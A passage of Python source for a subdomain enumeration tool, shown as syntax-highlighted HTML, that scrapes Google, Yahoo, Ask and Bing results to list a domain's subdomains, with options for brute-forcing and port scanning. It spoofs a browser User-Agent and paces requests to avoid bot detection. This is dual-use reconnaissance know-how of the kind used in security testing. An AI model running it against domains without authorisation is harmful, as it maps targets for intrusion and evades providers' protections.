&quot;</span> + errmsg + W)</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_args</span>():</span><br><span class="line">    <span class="comment"># parse the arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(epilog=<span class="string">&#x27;\tExample: \r\npython &#x27;</span> + sys.argv[<span class="number">0</span>] + <span class="string">&quot; -d google.com&quot;</span>)</span><br><span class="line">    parser.error = parser_error</span><br><span class="line">    parser._optionals.title = <span class="string">&quot;OPTIONS&quot;</span></span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-d&#x27;</span>, <span class="string">&#x27;--domain&#x27;</span>, <span class="built_in">help</span>=<span class="string">&quot;Domain name to enumerate it&#x27;s subdomains&quot;</span>, required=<span class="literal">True</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-b&#x27;</span>, <span class="string">&#x27;--bruteforce&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Enable the subbrute bruteforce module&#x27;</span>, nargs=<span class="string">&#x27;?&#x27;</span>, default=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--ports&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Scan the found subdomains against specified tcp ports&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-v&#x27;</span>, <span class="string">&#x27;--verbose&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Enable Verbosity and display results in realtime&#x27;</span>, nargs=<span class="string">&#x27;?&#x27;</span>, default=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-t&#x27;</span>, <span class="string">&#x27;--threads&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Number of threads to use for subbrute bruteforce&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, default=<span class="number">30</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-e&#x27;</span>, <span class="string">&#x27;--engines&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Specify a comma-separated list of search engines&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-o&#x27;</span>, <span class="string">&#x27;--output&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Save the results to text file&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-n&#x27;</span>, <span class="string">&#x27;--no-color&#x27;</span>, <span class="built_in">help</span>=<span class="string">&#x27;Output without color&#x27;</span>, default=<span class="literal">False</span>, action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> parser.parse_args()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_file</span>(<span class="params">filename, subdomains</span>):</span><br><span class="line">    <span class="comment"># saving subdomains results to output file</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s[-] Saving results to file: %s%s%s%s&quot;</span> % (Y, W, R, filename, W))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="built_in">str</span>(filename), <span class="string">&#x27;wt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">            f.write(subdomain + os.linesep)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">subdomain_sorting_key</span>(<span class="params">hostname</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Sorting key for subdomains</span></span><br><span class="line"><span class="string">    This sorting key orders subdomains from the top-level domain at the right</span></span><br><span class="line"><span class="string">    reading left, then moving &#x27;^&#x27; and &#x27;www&#x27; to the top of their group. For</span></span><br><span class="line"><span class="string">    example, the following list is sorted correctly:</span></span><br><span class="line"><span class="string">    [</span></span><br><span class="line"><span class="string">        &#x27;example.com&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;www.example.com&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;a.example.com&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;www.a.example.com&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;b.a.example.com&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;b.example.com&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;example.net&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;www.example.net&#x27;,</span></span><br><span class="line"><span class="string">        &#x27;a.example.net&#x27;,</span></span><br><span class="line"><span class="string">    ]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    parts = hostname.split(<span class="string">&#x27;.&#x27;</span>)[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> parts[-<span class="number">1</span>] == <span class="string">&#x27;www&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> parts[:-<span class="number">1</span>], <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> parts, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">enumratorBase</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, base_url, engine_name, domain, subdomains=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        self.domain = urlparse.urlparse(domain).netloc</span><br><span class="line">        self.session = requests.Session()</span><br><span class="line">        self.subdomains = []</span><br><span class="line">        self.timeout = <span class="number">25</span></span><br><span class="line">        self.base_url = base_url</span><br><span class="line">        self.engine_name = engine_name</span><br><span class="line">        self.silent = silent</span><br><span class="line">        self.verbose = verbose</span><br><span class="line">        self.headers = &#123;</span><br><span class="line">            <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;en-US,en;q=0.8&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">        &#125;</span><br><span class="line">        self.print_banner()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_</span>(<span class="params">self, text</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.silent:</span><br><span class="line">            <span class="built_in">print</span>(text)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">print_banner</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; subclass can override this if they want a fancy banner :)&quot;&quot;&quot;</span></span><br><span class="line">        self.print_(G + <span class="string">&quot;[-] Searching now in %s..&quot;</span> % (self.engine_name) + W)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">send_req</span>(<span class="params">self, query, page_no=<span class="number">1</span></span>):</span><br><span class="line"></span><br><span class="line">        url = self.base_url.<span class="built_in">format</span>(query=query, page_no=page_no)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            resp = self.session.get(url, headers=self.headers, timeout=self.timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            resp = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">return</span> self.get_response(resp)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_response</span>(<span class="params">self, response</span>):</span><br><span class="line">        <span class="keyword">if</span> response <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> response.text <span class="keyword">if</span> <span class="built_in">hasattr</span>(response, <span class="string">&quot;text&quot;</span>) <span class="keyword">else</span> response.content</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_max_subdomains</span>(<span class="params">self, count</span>):</span><br><span class="line">        <span class="keyword">if</span> self.MAX_DOMAINS == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> count &gt;= self.MAX_DOMAINS</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_max_pages</span>(<span class="params">self, num</span>):</span><br><span class="line">        <span class="keyword">if</span> self.MAX_PAGES == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> num &gt;= self.MAX_PAGES</span><br><span class="line"></span><br><span class="line">    <span class="comment"># override</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; chlid class should override this function &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># override</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_response_errors</span>(<span class="params">self, resp</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; chlid class should override this function</span></span><br><span class="line"><span class="string">        The function should return True if there are no errors and False otherwise</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">should_sleep</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;Some enumrators require sleeping to avoid bot detections like Google enumerator&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_query</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; chlid class should override this function &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">self, num</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot; chlid class that user different pagnation counter should override this function &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> num + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">enumerate</span>(<span class="params">self, altquery=<span class="literal">False</span></span>):</span><br><span class="line">        flag = <span class="literal">True</span></span><br><span class="line">        page_no = <span class="number">0</span></span><br><span class="line">        prev_links = []</span><br><span class="line">        retries = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> flag:</span><br><span class="line">            query = self.generate_query()</span><br><span class="line">            count = query.count(self.domain)  <span class="comment"># finding the number of subdomains found so far</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># if they we reached the maximum number of subdomains in search query</span></span><br><span class="line">            <span class="comment"># then we should go over the pages</span></span><br><span class="line">            <span class="keyword">if</span> self.check_max_subdomains(count):</span><br><span class="line">                page_no = self.get_page(page_no)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> self.check_max_pages(page_no):  <span class="comment"># maximum pages for Google to avoid getting blocked</span></span><br><span class="line">                <span class="keyword">return</span> self.subdomains</span><br><span class="line">            resp = self.send_req(query, page_no)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># check if there is any error occured</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.check_response_errors(resp):</span><br><span class="line">                <span class="keyword">return</span> self.subdomains</span><br><span class="line">            links = self.extract_domains(resp)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># if the previous page hyperlinks was the similar to the current one, then maybe we have reached the last page</span></span><br><span class="line">            <span class="keyword">if</span> links == prev_links:</span><br><span class="line">                retries += <span class="number">1</span></span><br><span class="line">                page_no = self.get_page(page_no)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># make another retry maybe it isn&#x27;t the last page</span></span><br><span class="line">                <span class="keyword">if</span> retries &gt;= <span class="number">3</span>:</span><br><span class="line">                    <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line">            prev_links = links</span><br><span class="line">            self.should_sleep()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> self.subdomains</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">enumratorBaseThreaded</span>(multiprocessing.Process, enumratorBase):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, base_url, engine_name, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        enumratorBase.__init__(self, base_url, engine_name, domain, subdomains, silent=silent, verbose=verbose)</span><br><span class="line">        multiprocessing.Process.__init__(self)</span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        domain_list = self.<span class="built_in">enumerate</span>()</span><br><span class="line">        <span class="keyword">for</span> domain <span class="keyword">in</span> domain_list:</span><br><span class="line">            self.q.append(domain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GoogleEnum</span>(<span class="title class_ inherited__">enumratorBaseThreaded</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">&quot;https://google.com/search?q=&#123;query&#125;&amp;btnG=Search&amp;hl=en-US&amp;biw=&amp;bih=&amp;gbv=1&amp;start=&#123;page_no&#125;&amp;filter=0&quot;</span></span><br><span class="line">        self.engine_name = <span class="string">&quot;Google&quot;</span></span><br><span class="line">        self.MAX_DOMAINS = <span class="number">11</span></span><br><span class="line">        self.MAX_PAGES = <span class="number">200</span></span><br><span class="line">        <span class="built_in">super</span>(GoogleEnum, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        links_list = <span class="built_in">list</span>()</span><br><span class="line">        link_regx = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;cite.*?&gt;(.*?)&lt;\/cite&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links_list = link_regx.findall(resp)</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links_list:</span><br><span class="line">                link = re.sub(<span class="string">&#x27;&lt;span.*&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, link)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> link.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">                    link = <span class="string">&quot;http://&quot;</span> + link</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">and</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">&quot;%s%s: %s%s&quot;</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> links_list</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_response_errors</span>(<span class="params">self, resp</span>):</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">type</span>(resp) <span class="keyword">is</span> <span class="built_in">str</span> <span class="keyword">or</span> <span class="built_in">type</span>(resp) <span class="keyword">is</span> <span class="built_in">str</span>) <span class="keyword">and</span> <span class="string">&#x27;Our systems have detected unusual traffic&#x27;</span> <span class="keyword">in</span> resp:</span><br><span class="line">            self.print_(R + <span class="string">&quot;[!] Error: Google probably now is blocking our requests&quot;</span> + W)</span><br><span class="line">            self.print_(R + <span class="string">&quot;[~] Finished now the Google Enumeration ...&quot;</span> + W)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">should_sleep</span>(<span class="params">self</span>):</span><br><span class="line">        time.sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_query</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.subdomains:</span><br><span class="line">            fmt = <span class="string">&#x27;site:&#123;domain&#125; -www.&#123;domain&#125; -&#123;found&#125;&#x27;</span></span><br><span class="line">            found = <span class="string">&#x27; -&#x27;</span>.join(self.subdomains[:self.MAX_DOMAINS - <span class="number">2</span>])</span><br><span class="line">            query = fmt.<span class="built_in">format</span>(domain=self.domain, found=found)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            query = <span class="string">&quot;site:&#123;domain&#125; -www.&#123;domain&#125;&quot;</span>.<span class="built_in">format</span>(domain=self.domain)</span><br><span class="line">        <span class="keyword">return</span> query</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">YahooEnum</span>(<span class="title class_ inherited__">enumratorBaseThreaded</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">&quot;https://search.yahoo.com/search?p=&#123;query&#125;&amp;b=&#123;page_no&#125;&quot;</span></span><br><span class="line">        self.engine_name = <span class="string">&quot;Yahoo&quot;</span></span><br><span class="line">        self.MAX_DOMAINS = <span class="number">10</span></span><br><span class="line">        self.MAX_PAGES = <span class="number">0</span></span><br><span class="line">        <span class="built_in">super</span>(YahooEnum, self).__init__(base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        link_regx2 = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;span class=&quot; fz-.*? fw-m fc-12th wr-bw.*?&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>)</span><br><span class="line">        link_regx = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;span class=&quot;txt&quot;&gt;&lt;span class=&quot; cite fw-xl fz-15px&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>)</span><br><span class="line">        links_list = []</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links = link_regx.findall(resp)</span><br><span class="line">            links2 = link_regx2.findall(resp)</span><br><span class="line">            links_list = links + links2</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links_list:</span><br><span class="line">                link = re.sub(<span class="string">&quot;&lt;(\/)?b&gt;&quot;</span>, <span class="string">&quot;&quot;</span>, link)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> link.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">                    link = <span class="string">&quot;http://&quot;</span> + link</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> subdomain.endswith(self.domain):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">and</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">&quot;%s%s: %s%s&quot;</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> links_list</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">should_sleep</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">self, num</span>):</span><br><span class="line">        <span class="keyword">return</span> num + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_query</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.subdomains:</span><br><span class="line">            fmt = <span class="string">&#x27;site:&#123;domain&#125; -domain:www.&#123;domain&#125; -domain:&#123;found&#125;&#x27;</span></span><br><span class="line">            found = <span class="string">&#x27; -domain:&#x27;</span>.join(self.subdomains[:<span class="number">77</span>])</span><br><span class="line">            query = fmt.<span class="built_in">format</span>(domain=self.domain, found=found)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            query = <span class="string">&quot;site:&#123;domain&#125;&quot;</span>.<span class="built_in">format</span>(domain=self.domain)</span><br><span class="line">        <span class="keyword">return</span> query</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AskEnum</span>(<span class="title class_ inherited__">enumratorBaseThreaded</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">&#x27;http://www.ask.com/web?q=&#123;query&#125;&amp;page=&#123;page_no&#125;&amp;qid=8D6EE6BF52E0C04527E51F64F22C4534&amp;o=0&amp;l=dir&amp;qsrc=998&amp;qo=pagination&#x27;</span></span><br><span class="line">        self.engine_name = <span class="string">&quot;Ask&quot;</span></span><br><span class="line">        self.MAX_DOMAINS = <span class="number">11</span></span><br><span class="line">        self.MAX_PAGES = <span class="number">0</span></span><br><span class="line">        enumratorBaseThreaded.__init__(self, base_url, self.engine_name, domain, subdomains, q=q, silent=silent, verbose=verbose)</span><br><span class="line">        self.q = q</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        links_list = <span class="built_in">list</span>()</span><br><span class="line">        link_regx = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;p class=&quot;web-result-url&quot;&gt;(.*?)&lt;/p&gt;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links_list = link_regx.findall(resp)</span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links_list:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> link.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">                    link = <span class="string">&quot;http://&quot;</span> + link</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">&quot;%s%s: %s%s&quot;</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> links_list</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_page</span>(<span class="params">self, num</span>):</span><br><span class="line">        <span class="keyword">return</span> num + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_query</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.subdomains:</span><br><span class="line">            fmt = <span class="string">&#x27;site:&#123;domain&#125; -www.&#123;domain&#125; -&#123;found&#125;&#x27;</span></span><br><span class="line">            found = <span class="string">&#x27; -&#x27;</span>.join(self.subdomains[:self.MAX_DOMAINS])</span><br><span class="line">            query = fmt.<span class="built_in">format</span>(domain=self.domain, found=found)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            query = <span class="string">&quot;site:&#123;domain&#125; -www.&#123;domain&#125;&quot;</span>.<span class="built_in">format</span>(domain=self.domain)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> query</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BingEnum</span>(<span class="title class_ inherited__">enumratorBaseThreaded</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, domain, subdomains=<span class="literal">None</span>, q=<span class="literal">None</span>, silent=<span class="literal">False</span>, verbose=<span class="literal">True</span></span>):</span><br><span class="line">        subdomains = subdomains <span class="keyword">or</span> []</span><br><span class="line">        base_url = <span class="string">&#x27;https://www.bing.com/search?q=&#123;query&#125;&amp;go=Submit&amp;first=&#123;page_no&#125;&#x27;</span></span><br><span class="line">        self.engine_name = <span class="string">&quot;Bing&quot;</span></span><br><span class="line">        self.MAX_DOMAINS = <span class="number">30</span></span><br><span class="line">        self.MAX_PAGES = <span class="number">0</span></span><br><span class="line">        enumratorBaseThreaded.__init__(self, base_url, self.engine_name, domain, subdomains, q=q, silent=silent)</span><br><span class="line">        self.q = q</span><br><span class="line">        self.verbose = verbose</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">extract_domains</span>(<span class="params">self, resp</span>):</span><br><span class="line">        links_list = <span class="built_in">list</span>()</span><br><span class="line">        link_regx = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;li class=&quot;b_algo&quot;&gt;&lt;h2&gt;&lt;a href=&quot;(.*?)&quot;&#x27;</span>)</span><br><span class="line">        link_regx2 = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;div class=&quot;b_title&quot;&gt;&lt;h2&gt;&lt;a href=&quot;(.*?)&quot;&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            links = link_regx.findall(resp)</span><br><span class="line">            links2 = link_regx2.findall(resp)</span><br><span class="line">            links_list = links + links2</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> link <span class="keyword">in</span> links_list:</span><br><span class="line">                link = re.sub(<span class="string">&#x27;&lt;(\/)?strong&gt;|&lt;span.*?&gt;|&lt;|&gt;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, link)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> link.startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">                    link = <span class="string">&quot;http://&quot;</span> + link</span><br><span class="line">                subdomain = urlparse.urlparse(link).netloc</span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">&quot;%s%s: %s%s&quot;</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> links_list</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_query</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.subdomains:</span><br><span class="line">            fmt = <span class="string">&#x27;domain:&#123;domain&#125; -www.&#123;domain&#125; -&#123;found&#125;&#x27;</span></span><br><span class="line">            found = <span class="string">&#x27; -&#x27;</span>.join(self.subdomains[:self.MAX_DOMAINS])</span><br><span class="line">            query = fmt.<span class="built_in">format</span>(domain=self.domain, found=found)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            query = <span class="string">&quot;domain:&#123;domain&#125; -www.&#123;domain&#125;&quot;</span>.<span class="built_in">format</span>(domain=self.domain)</span><br><span class="line">        <span class="keyword">return</span> query</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">BaiduEnum</span>(<span class="title class_ inherited__">enumratorBaseThreaded</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span 